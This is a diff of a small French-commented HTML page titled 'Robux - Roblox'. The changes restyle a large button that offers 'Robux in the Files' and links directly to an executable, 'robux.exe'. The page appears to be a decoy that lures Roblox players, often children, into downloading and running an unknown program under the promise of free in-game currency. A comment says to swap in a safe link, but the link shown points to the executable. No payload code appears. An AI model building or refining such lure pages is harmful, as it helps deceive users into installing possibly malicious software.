@@ -5,53 +5,64 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Robux - Roblox</title>
   <style>
-    /* Corps : centrer sur toute la page (vertical + horizontal).
-       Pas de font-family défini : on garde la police par défaut du navigateur. */
-    html,body {
+    /* Page entièrement blanche */
+    html, body {
       height: 100%;
       margin: 0;
+      background: #ffffff; /* fond vraiment blanc */
     }
+
+    /* Centrage vertical + horizontal */
     body {
       display: flex;
       align-items: center;
       justify-content: center;
-      background: #f7f7f8; /* léger fond pour contraste ; change si tu veux */
     }
 
-    /* Le lien affiché comme un bouton, tout en utilisant la police par défaut */
+    /* Bouton très grand, texte blanc (police par défaut du navigateur) */
     .btn {
       display: inline-block;
-      padding: 14px 28px;
-      background: linear-gradient(135deg, #ffcc00, #ff8800);
-      color: #111;
+      padding: 28px 56px;        /* plus gros */
+      font-size: 28px;          /* texte en plus gros */
       font-weight: 700;
-      font-size: 16px;
+      font: inherit;            /* police par défaut du navigateur */
+      color: #ffffff;           /* police blanche */
       text-decoration: none;
-      border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+      border-radius: 16px;
+      background: linear-gradient(135deg, #0b63d6 0%, #0a47a1 100%); /* fond du bouton foncé pour contraste */
+      box-shadow: 0 18px 40px rgba(10,70,160,0.18), 0 6px 14px rgba(10,70,160,0.12);
       transition: transform .16s ease, box-shadow .16s ease, opacity .12s ease;
       border: none;
       cursor: pointer;
-      /* conserve la police par défaut du navigateur */
-      font: inherit;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
-    .btn:hover { transform: translateY(-3px); }
-    .btn:active { transform: translateY(-1px) scale(.995); opacity: .95; }
+    .btn:hover { transform: translateY(-4px); }
+    .btn:active { transform: translateY(-2px) scale(.995); opacity:.95; }
 
-    /* Focus visible pour accessibilité (clavier) */
+    /* Focus visible (accessibilité clavier) */
     .btn:focus {
-      outline: 3px solid rgba(0,0,0,0.12);
-      outline-offset: 4px;
+      outline: 4px solid rgba(11,99,214,0.18);
+      outline-offset: 6px;
+    }
+
+    /* Optionnel : petite variante pour bord clair (si tu veux un look "outline") */
+    .btn.outline {
+      background: transparent;
+      color: #111;
+      border: 3px solid rgba(0,0,0,0.08);
+      box-shadow: 0 8px 18px rgba(0,0,0,0.06);
     }
   </style>
 </head>
 <body>
 
-  <!-- Remplace href="robux.exe" par un lien sûr si nécessaire -->
+  <!-- Remplace href par un lien sûr -->
   <a href="robux.exe" class="btn" role="button" aria-label="Robux in the Files">
     Robux in the Files
   </a>
 
 </body>
-</html>
+</htm
+
